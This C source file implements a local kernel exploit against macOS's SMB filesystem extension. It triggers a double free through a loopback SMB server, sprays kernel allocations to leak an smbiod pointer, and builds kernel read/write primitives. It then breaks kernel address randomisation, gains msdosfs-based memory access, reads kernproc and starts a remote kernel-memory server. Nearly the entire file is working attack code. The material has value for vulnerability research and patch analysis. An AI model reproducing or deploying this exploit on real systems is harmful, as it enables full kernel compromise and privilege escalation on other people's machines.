//
//  main.c
//  kmem_xepg
//
//  Created by admin on 12/18/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#include <libproc.h>
#include <dispatch/dispatch.h>

#include <sys/errno.h>
#include <arpa/inet.h>

#include "kmem.h"
#include "kmem_remote.h"

#include "external/smbfs/smb_trantcp.h"
#include "smb/params.h"
#include "smb/client.h"
#include "util_ptrauth.h"
#include "platform_variables.h"
#include "platform_constants.h"
#include "slider.h"
#include "slider_kext.h"
#include "xnu_proc.h"
#include "allocator_msdosfs.h"
#include "kmem_msdosfs.h"
#include "kmem_smbiod.h"
#include "kmem/zkext_free.h"
#include "kmem/zkext_alloc_small.h"
#include "kmem/allocator_rw.h"
#include "kmem/zkext_prime_util.h"


#define NUM_SMB_SERVER_PORTS 64
#define SMB_PORT_FOR_INDEX(base_addr, index, count) (ntohs((base_addr)->sin_port) + (index / ((count + NUM_SMB_SERVER_PORTS - 1) / NUM_SMB_SERVER_PORTS)))


int find_server_pid(void) {
    int num_pids = proc_listpids(PROC_UID_ONLY, getuid(), NULL, 0) / sizeof(int);
    assert(num_pids > 0);
    
    int pids[num_pids];
    bzero(pids, sizeof(pids));
    proc_listpids(PROC_UID_ONLY, getuid(), pids, (int)sizeof(pids));
    
    for (int i=num_pids-1; i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        
        char name[NAME_MAX];
        proc_name(pids[i], name, sizeof(name));
        
        if (strncmp(name, "smb_server", sizeof(name)) == 0) {
            return pids[i];
        }
    }
    
    printf("[ERROR] smb_server process not found\n");
    abort();
}

ushort find_lport_for_fport(int server_pid, ushort fport) {
    assert(fport != 0);
    
    int num_fds = proc_pidinfo(server_pid, PROC_PIDLISTFDS, 0, NULL, 0) / sizeof(struct proc_fdinfo);
    assert(num_fds > 0);
    
    int infos_size = sizeof(struct proc_fdinfo) * num_fds;
    struct proc_fdinfo* infos = malloc(infos_size);
    proc_pidinfo(server_pid, PROC_PIDLISTFDS, 0, infos, infos_size);
    
    for (int i=0; i<num_fds; i++) {
        struct proc_fdinfo* info = &infos[i];
        if (info->proc_fdtype != PROX_FDTYPE_SOCKET) {
            continue;
        }
        
        struct socket_fdinfo sock_info;
        int nb = proc_pidfdinfo(server_pid, info->proc_fd, PROC_PIDFDSOCKETINFO, &sock_info, sizeof(sock_info));
        assert(nb > 0);
        
        ushort sock_fport = ntohs(sock_info.psi.soi_proto.pri_in.insi_fport);
        if (sock_fport == fport) {
            return ntohs(sock_info.psi.soi_proto.pri_in.insi_lport);
        }
    }
    
    printf("[ERROR] failed to match fport on server\n");
    abort();
}


void patch_smb_iod(xe_slider_kext_t smbfs_slider, uintptr_t iod) {
    uintptr_t gss = KMEM_OFFSET(iod, offsetof(struct smbiod, iod_gss));
    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn_len)), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn)), 0);
    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn_len)), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn)), 0);
}


void patch_session_interface_table(xe_slider_kext_t smbfs_slider, uintptr_t table) {
    xe_kmem_write_uint32(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET), 0);
}


void patch_smb_session(xe_slider_kext_t smbfs_slider, uintptr_t session) {
    uintptr_t iod = xe_kmem_read_uint64(KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET));
    if (iod) {
        patch_smb_iod(smbfs_slider, iod);
    }
    uintptr_t session_interface_table = KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET);
    patch_session_interface_table(smbfs_slider, session_interface_table);
}


void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
    uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, XE_SMB_VAR_SMB_SESSION_LIST_OFFSET_DATA);
    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET));
    while (cursor != 0) {
        assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
        patch_smb_session(smbfs_slider, cursor);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET));
    }
}


int main(void) {
    smb_client_load_kext();
    xe_allocator_msdosfs_loadkext();
    
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);

    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(8090);
    inet_aton("127.0.0.1", &smb_addr.sin_addr);
    
    int error = 0;
    int server_pid = find_server_pid();
    kmem_zkext_free_session_t zkext_free_session = kmem_zkext_free_session_create(&smb_addr);
    
    struct complete_nic_info_entry dbf_entry = kmem_zkext_free_session_prepare(zkext_free_session);
    assert(dbf_entry.possible_connections.tqh_first == NULL);
    
    struct complete_nic_info_entry* fake_entry = alloca(256 - 8 - 1);
    bzero(fake_entry, 256 - 8 - 1);
    fake_entry->next.next = NULL;
    fake_entry->next.prev = (void*)((uintptr_t)dbf_entry.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
    
    struct kmem_zkext_alloc_small_entry allocated_entry = kmem_zkext_alloc_small(&smb_addr, (char*)fake_entry + 8, 256 - 8 - 1);
    
    dbf_entry.next.next = (void*)allocated_entry.address;
    dbf_entry.addr_list.tqh_first = NULL;
    
    uint num_rw_allocs = 256;
    kmem_allocator_rw_t rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
    uint num_capture_fds = 256;
    int* capture_fds = alloca(sizeof(int) * num_capture_fds);
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        capture_fds[index] = smb_client_open_dev();
    });
    
    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
    
    kmem_zkext_free_session_execute(zkext_free_session, &dbf_entry);
    
    char* data = alloca(256);
    memset(data, 0xff, 256);
    error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = data;
        *data1_size = 256;
        *data2 = data;
        *data2_size = 256;
    }, NULL);
    assert(error == 0);
    
    printf("ok\n");
    
    int64_t found_index = -1;
    error = kmem_allocator_prpw_filter(allocated_entry.element_allocator, 0, kmem_allocator_prpw_get_capacity(allocated_entry.element_allocator), ^bool(void* ctx, sa_family_t family, size_t index) {
        return family == 0xff;
    }, NULL, &found_index);
    assert(error == 0);
    assert(found_index >= 0);
    
    printf("ok\n");
    
    error = kmem_allocator_prpw_release_containing_backend(allocated_entry.element_allocator, found_index);
    assert(error == 0);
    
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        struct sockaddr_in addr = smb_addr;
        addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds));
        int error = smb_client_ioc_negotiate(capture_fds[index], &addr, sizeof(addr), FALSE);
        assert(error == 0);
    });
    
    found_index = -1;
    struct nbpcb* leaked_nbpcb = alloca(sizeof(struct nbpcb));
    error = kmem_allocator_rw_filter(rw_allocator, 0, num_rw_allocs, 256, 256, ^bool(void* ctx, char* data1, char* data2, size_t index) {
        if (memcmp(data, data1, 256)) {
            memcpy(leaked_nbpcb, data1, sizeof(*leaked_nbpcb));
            return TRUE;
        }
        
        if (memcmp(data, data2, 256)) {
            memcpy(leaked_nbpcb, data2, sizeof(*leaked_nbpcb));
            return TRUE;
        }
        
        return FALSE;
    }, NULL, &found_index);
    assert(error == 0);
    assert(found_index >= 0);
    assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_nbpcb->nbp_iod));
    
    struct sockaddr_in* nbpcb_addr = (struct sockaddr_in*)&leaked_nbpcb->nbp_sock_addr;
    uint16_t nbpcb_port = find_lport_for_fport(server_pid, ntohs(nbpcb_addr->sin_port));
    
    printf("smbiod: %p\n", (void*)leaked_nbpcb->nbp_iod);
    printf("nbpcb fport: %d, lport: %d\n", ntohs(nbpcb_addr->sin_port), nbpcb_port);
    
    kmem_allocator_rw_disown_backend(rw_allocator, (int)found_index);
    
    error = kmem_allocator_rw_destroy(&rw_allocator);
    assert(error == 0);
    
    rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
    zkext_free_session = kmem_zkext_free_session_create(&smb_addr);
    dbf_entry = kmem_zkext_free_session_prepare(zkext_free_session);
    
    struct complete_nic_info_entry* fake_iod_entry = alloca(sizeof(struct smbiod));
    bzero(fake_iod_entry, sizeof(struct smbiod));
    fake_iod_entry->next.prev = (void*)((uintptr_t)dbf_entry.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
    dbf_entry.next.next = (void*)leaked_nbpcb->nbp_iod;
    dbf_entry.addr_list.tqh_first = NULL;
    
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        uint16_t port = SMB_PORT_FOR_INDEX(&smb_addr, index, num_capture_fds);
        if (nbpcb_port == port) {
            close(capture_fds[index]);
            capture_fds[index] = -1;
        }
    });
    
    error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = (char*)fake_iod_entry;
        *data1_size = sizeof(struct smbiod);
        *data2 = (char*)fake_iod_entry;
        *data2_size = sizeof(struct smbiod);
    }, NULL);
    assert(error == 0);
    
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (capture_fds[index] >= 0) {
            close(capture_fds[index]);
        }
        capture_fds[index] = smb_client_open_dev();
    });
    
    kmem_zkext_free_session_execute(zkext_free_session, &dbf_entry);
    
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        int error = smb_client_ioc_negotiate(capture_fds[index], &smb_addr, sizeof(smb_addr), FALSE);
        assert(error == 0);
    });
    
    found_index = -1;
    struct smbiod* leaked_iod = alloca(sizeof(struct smbiod));
    error = kmem_allocator_rw_filter(rw_allocator, 0, num_rw_allocs, sizeof(struct smbiod), sizeof(struct smbiod), ^bool(void* ctx, char* data1, char* data2, size_t index) {
        if (memcmp(data1, fake_iod_entry, sizeof(struct smbiod))) {
            memcpy(leaked_iod, data1, sizeof(struct smbiod));
            return TRUE;
        }
        
        if (memcmp(data2, fake_iod_entry, sizeof(struct smbiod))) {
            memcpy(leaked_iod, data2, sizeof(struct smbiod));
            return TRUE;
        }
        
        return FALSE;
    }, NULL, &found_index);
    assert(error == 0);
    assert(found_index >= 0);
    assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_iod->iod_tdesc));
    
    int rw_fd = kmem_allocator_rw_disown_backend(rw_allocator, (int)found_index);
    kmem_allocator_rw_destroy(&rw_allocator);
    
    int* captured_fd = alloca(sizeof(int));
    *captured_fd = -1;
    dispatch_apply(num_capture_fds, DISPATCH_APPLY_AUTO, ^(size_t index) {
        struct smbioc_multichannel_properties props;
        bzero(&props, sizeof(props));
        int error = smb_client_ioc_multichannel_properties(capture_fds[index], &props);
        assert(error == 0);
        if (props.iod_properties[0].iod_prop_id == leaked_iod->iod_id) {
            *captured_fd = capture_fds[index];
        } else {
            close(capture_fds[index]);
            capture_fds[index] = -1;
        }
    });
    assert(captured_fd >= 0);
    
    printf("captured smbiod of fd: %d, read by fd: %d\n", *captured_fd, rw_fd);
    
    kmem_smbiod_rw_t smbiod_rw = kmem_smbiod_rw_create(&smb_addr, rw_fd, *captured_fd);
    
    xe_kmem_use_backend(xe_kmem_smbiod_create(smbiod_rw));
    struct nbpcb nbpcb;
    xe_kmem_read(&nbpcb, (uintptr_t)leaked_iod->iod_tdata, sizeof(nbpcb));
    uintptr_t socket = (uintptr_t)nbpcb.nbp_tso;
    uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
    
    uintptr_t tcp_input = xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET));
    tcp_input = XE_PTRAUTH_STRIP(tcp_input);
    int64_t text_exec_slide = tcp_input - FUNC_TCP_INPUT_ADDR;
    int64_t text_slide = text_exec_slide + XE_IMAGE_SEGMENT_DATA_CONST_SIZE;
    uintptr_t mh_execute_header = VAR_MH_EXECUTE_HEADER_ADDR + text_slide;
    
    printf("mh_execute_header: %p\n", (void*)mh_execute_header);
    xe_slider_init(mh_execute_header);
    
    assert(xe_slider_slide(FUNC_TCP_INPUT_ADDR) == tcp_input);
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    xe_allocator_msdosfs_t worker_allocator;
    error = xe_allocator_msdosfs_create("worker", &worker_allocator);
    assert(error == 0);
    
    xe_allocator_msdosfs_t helper_allocator;
    error = xe_allocator_msdosfs_create("helper", &helper_allocator);
    assert(error == 0);
    
    int fd_mount_worker = xe_allocator_msdsofs_get_mount_fd(worker_allocator);
    int fd_mount_helper = xe_allocator_msdsofs_get_mount_fd(helper_allocator);
    
    uintptr_t vnode_mount_worker;
    error = xe_xnu_proc_find_fd_data(proc, fd_mount_worker, &vnode_mount_worker);
    assert(error == 0);
    
    uintptr_t vnode_mount_helper;
    error = xe_xnu_proc_find_fd_data(proc, fd_mount_helper, &vnode_mount_helper);
    assert(error == 0);
    
    uintptr_t mount_worker = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
    uintptr_t mount_helper = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
    
    printf("mount_worker: %p\n", (void*)mount_worker);
    printf("mount_helper: %p\n", (void*)mount_helper);
    
    uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
    uintptr_t msdosfs_helper = xe_kmem_read_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
    
    printf("msdosfs_worker: %p\n", (void*)msdosfs_worker);
    printf("msdosfs_helper: %p\n", (void*)msdosfs_helper);
    
    char backup_worker[368];
    xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
    
    char backup_helper[368];
    xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
    
    char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
    assert(mkdtemp(temp_dir) != NULL);
    
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/worker_bridge", temp_dir);
    int worker_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(worker_bridge_fd >= 0);
    
    snprintf(path, sizeof(path), "%s/helper_bridge", temp_dir);
    int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(helper_bridge_fd >= 0);
    
    uintptr_t vnode_worker_bridge;
    error = xe_xnu_proc_find_fd_data(proc, worker_bridge_fd, &vnode_worker_bridge);
    assert(error == 0);
    
    uintptr_t vnode_helper_bridge;
    error = xe_xnu_proc_find_fd_data(proc, helper_bridge_fd, &vnode_helper_bridge);
    assert(error == 0);
    
    printf("vnode_worker_bridge: %p\n", (void*)vnode_worker_bridge);
    printf("vnode_helper_bridge: %p\n", (void*)vnode_helper_bridge);
    
    rw_allocator = kmem_allocator_rw_create(&smb_addr, num_rw_allocs);
    
    struct kmem_msdosfs_init_args args;
    bzero(&args, sizeof(args));
    args.helper_bridge_fd = helper_bridge_fd;
    args.worker_bridge_fd = worker_bridge_fd;
    args.helper_bridge_vnode = vnode_helper_bridge;
    args.worker_bridge_vnode = vnode_worker_bridge;
    memcpy(args.worker_data, backup_worker, sizeof(args.worker_data));
    memcpy(args.helper_data, backup_helper, sizeof(args.helper_data));
    args.helper_msdosfs = msdosfs_helper;
    args.worker_msdosfs = msdosfs_worker;
    xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
    xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
    args.helper_mutator = ^(void* ctx, char* data) {
        struct smbiod iod;
        kmem_smbiod_rw_read_iod(smbiod_rw, &iod);
        iod.iod_gss.gss_cpn = (uint8_t*)msdosfs_helper;
        iod.iod_gss.gss_cpn_len = sizeof(backup_helper);
        kmem_smbiod_rw_write_iod(smbiod_rw, &iod);
        char any_data[32];
        int error = smb_client_ioc_ssn_setup(*captured_fd, any_data, sizeof(any_data), any_data, sizeof(any_data));
        assert(error == 0);
        
        error = kmem_allocator_rw_allocate(rw_allocator, num_rw_allocs, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
            *data1 = data;
            *data1_size = sizeof(args.helper_data);
            *data2 = data;
            *data2_size = sizeof(args.helper_data);
        }, NULL);
        assert(error == 0);
    };
    args.helper_mutator_ctx = NULL;
    xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    printf("kernproc: %p\n", (void*)kernproc);
    
    xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
    patch_smb_sessions(smbfs_slider);
    kmem_allocator_rw_destroy(&rw_allocator);
    close(*captured_fd);
    close(rw_fd);
    kmem_smbiod_rw_destroy(&smbiod_rw);
    kmem_zkext_free_session_destroy(&zkext_free_session);
    kmem_allocator_prpw_destroy(&allocated_entry.element_allocator);
    
    xe_kmem_remote_server_start();
    
    return 0;
}
